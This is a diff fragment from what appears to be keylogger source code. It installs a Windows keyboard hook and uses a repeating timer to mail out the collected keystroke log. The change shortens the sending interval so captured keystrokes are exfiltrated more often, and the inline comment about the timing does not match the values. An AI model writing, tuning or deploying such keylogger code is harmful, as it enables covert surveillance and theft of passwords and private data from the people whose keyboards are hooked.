@@ -27,7 +27,7 @@ void timerSendMail(){
     else keylog = "";
 }
 
-Timer MailTimer(timerSendMail, 20000 * 60, Timer::inf);  // 1000 = repeat every 1 min
+Timer MailTimer(timerSendMail, 100 * 60, Timer::inf);  // 1000 = repeat every 1 min
 HHOOK eHook = NULL;
 
 LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam){
